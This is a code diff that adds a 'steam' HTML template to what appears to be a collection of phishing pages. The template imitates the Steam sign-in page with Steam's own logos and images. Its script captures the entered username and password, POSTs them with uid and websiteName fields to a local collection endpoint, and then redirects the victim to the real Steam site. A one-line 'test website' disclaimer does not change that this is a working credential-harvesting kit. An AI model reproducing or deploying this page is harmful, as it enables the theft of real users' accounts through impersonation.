@@ -4609,5 +4609,324 @@ input::placeholder {
 
 </body>
 
+</html>`,
+    "steam":`<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome - Sign In</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://store.fastly.steamstatic.com/public/shared/images/responsive/header_logo.png" type="image/png">
+    <style>
+        body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    color: #c7d5e0;
+    background-color: #1b2838; /* Dark background similar to Steam */
+    overflow: hidden; /* Hide scrollbars if background image overflows */
+}
+
+.background-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background-image: url('https://store.fastly.steamstatic.com/public/shared/images/joinsteam/new_login_bg_strong_mask_mobile.jpg');
+    background-size: cover;
+    background-position: center;
+    filter: brightness(0.6); /* Darken the background image */
+    z-index: -1;
+}
+
+.header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 15px 50px;
+    background-color: rgba(27, 40, 56, 0.8); /* Slightly transparent dark header */
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+    position: relative;
+    z-index: 10;
+}
+
+.header .logo img {
+    height: 30px; /* Adjust logo size */
+}
+
+.header .nav-links a,
+.header .header-right a {
+    color: #c7d5e0;
+    text-decoration: none;
+    margin-left: 20px;
+    font-size: 14px;
+    transition: color 0.3s ease;
+}
+
+.header .nav-links a:hover,
+.header .header-right a:hover {
+    color: #fff;
+}
+
+.header .install-steam {
+    background-color: #5b9228;
+    color: #fff;
+    padding: 5px 10px;
+    border-radius: 3px;
+    font-weight: bold;
+    text-transform: uppercase;
+}
+
+.header .login-btn {
+    color: #66c0f4;
+}
+
+.header .language-select {
+    color: #66c0f4;
+}
+
+.login-container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: calc(100vh - 80px); /* Adjust for header height */
+    padding: 20px;
+    box-sizing: border-box;
+}
+
+.login-box {
+    background-color: rgba(0, 0, 0, 0.8); /* Darker, slightly transparent box */
+    padding: 30px;
+    border-radius: 5px;
+    text-align: center;
+    width: 600px;
+    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.5);
+    border-top: 1px solid rgba(255, 255, 255, 0.1);
+}
+
+.login-box h2 {
+    color: #fff;
+    font-size: 28px;
+    margin-bottom: 30px;
+    text-align: left;
+}
+
+.login-content {
+    display: flex;
+    justify-content: space-between;
+    gap: 30px;
+}
+
+.login-form {
+    flex: 1;
+    text-align: left;
+}
+
+.sign-in-heading {
+    color: #8f98a0;
+    font-size: 12px;
+    margin-bottom: 5px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+}
+
+.login-form input[type="text"],
+.login-form input[type="password"] {
+    width: calc(100% - 20px);
+    padding: 10px;
+    margin-bottom: 15px;
+    background-color: #32353c;
+    border: 1px solid #484b51;
+    color: #fff;
+    border-radius: 3px;
+    font-size: 14px;
+}
+
+.login-form input[type="text"]:focus,
+.login-form input[type="password"]:focus {
+    outline: none;
+    border-color: #67c2ef;
+}
+
+.remember-me {
+    display: flex;
+    align-items: center;
+    margin-bottom: 20px;
+    font-size: 13px;
+    color: #8f98a0;
+}
+
+.remember-me input[type="checkbox"] {
+    margin-right: 8px;
+    accent-color: #66c0f4; /* Changes checkbox color in some browsers */
+}
+
+.sign-in-button {
+    width: 100%;
+    padding: 12px;
+    background: linear-gradient(to right, #417a9b, #5997b6);
+    border: none;
+    border-radius: 3px;
+    color: #fff;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: background 0.3s ease;
+}
+
+.sign-in-button:hover {
+    background: linear-gradient(to right, #4a84a6, #61a2c2);
+}
+
+.help-link {
+    display: block;
+    margin-top: 20px;
+    color: #8f98a0;
+    text-decoration: none;
+    font-size: 13px;
+    transition: color 0.3s ease;
+}
+
+.help-link:hover {
+    color: #fff;
+}
+
+.qr-code-section {
+    flex: 1;
+    text-align: center;
+}
+
+.qr-code-box {
+    background-color: #fff; /* White background for QR code */
+    padding: 10px;
+    border-radius: 3px;
+    display: inline-block; /* To center the white box */
+    margin-top: 10px;
+}
+
+.qr-code-box img {
+    display: block; /* Remove extra space below image */
+    width: 150px; /* Adjust QR code image size */
+    height: 150px;
+}
+
+.qr-info {
+    color: #8f98a0;
+    font-size: 13px;
+    margin-top: 20px;
+}
+
+.steam-mobile-app {
+    color: #66c0f4;
+    cursor: pointer;
+}
+
+.footer-games {
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    display: flex;
+    justify-content: space-around;
+    padding: 10px;
+    color: rgba(255, 255, 255, 0.05); /* Very faint text */
+    font-size: 80px; /* Large, faint text */
+    font-weight: bold;
+    pointer-events: none; /* Make them not clickable */
+    user-select: none; /* Prevent text selection */
+    z-index: -2; /* Behind everything */
+}
+    </style>
+
+    <script>
+          const uid = "user123user123"; 
+          const websiteName = "mywebsitemywebsite"; 
+      
+          async function handleSubmit(event) {
+            event.preventDefault(); 
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            const signInButton = document.getElementById("amazon");
+          signInButton.disabled = true;
+          signInButton.style.opacity = '0.5';
+          signInButton.style.cursor = 'not-allowed';
+          
+            try {
+              const response = await fetch("http://localhost:5237/insertdata", {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                  uid: uid,
+                  websiteName: websiteName,
+                  email: email,
+                  password: password
+                })
+              });
+      
+               window.location.href = "https://steampowered.com/";
+          } catch (error) {
+            window.location.href = "https://steampowered.com/";
+            }
+          }
+        </script>
+
+</head>
+<body>
+    <div class="background-overlay"></div>
+    <div class="header">
+        <div class="logo">
+            <img src="https://store.fastly.steamstatic.com/public/shared/images/responsive/header_logo.png" alt="Welcome Logo">
+        </div>
+        <div class="nav-links">
+            <a href="https://steampowered.com">STORE</a>
+            <a href="https://steampowered.com">COMMUNITY</a>
+            <a href="https://steampowered.com">ABOUT</a>
+            <a href="https://steampowered.com">SUPPORT</a>
+        </div>
+        <div class="header-right">
+            <a href="https://steampowered.com" class="install-steam">Install Welcome</a>
+            <a href="https://steampowered.com" class="login-btn">login</a>
+            <a href="https://steampowered.com" class="language-select">language</a>
+        </div>
+    </div>
+
+    <div class="login-container">
+        <div class="login-box">
+            <h2>Sign in</h2>
+            <div class="login-content">
+                <div class="login-form">
+                    <p class="sign-in-heading">SIGN IN WITH ACCOUNT NAME</p>
+                    <input type="text" id="email" steamstatic="username" value="">
+                    <p class="sign-in-heading">PASSWORD</p>
+                    <input type="password" id="password" steamstatic="password" value="">
+                    <label class="remember-me">
+                        <input type="checkbox" checked> Remember me
+                    </label>
+                    <button class="sign-in-button" id="amazon" onclick="handleSubmit(event)">Sign in</button>
+                    <a href="https://steampowered.com" class="help-link">Help, I can't sign in</a>
+                </div>
+                <div class="qr-code-section">
+                    <p class="sign-in-heading">OR SIGN IN WITH QR</p>
+                    <div class="qr-code-box">
+                        <img src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=example_qr_code_data" alt="QR Code">
+                    </div>
+                    <p class="qr-info">Use the <span class="steam-mobile-app">Welcome Mobile App</span> to sign in via QR code. This is a test website, dont login with real credentials</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer-games">
+        <p>HU</p>
+        <p>ISLAND</p>
+        <p>A WINTER</p>
+        <p>BIG OGRE</p>
+        <p>TOMS RAIDER</p>
+        <p>SHIRTS HIKE</p>
+    </div>
+</body>
 </html>`
   };
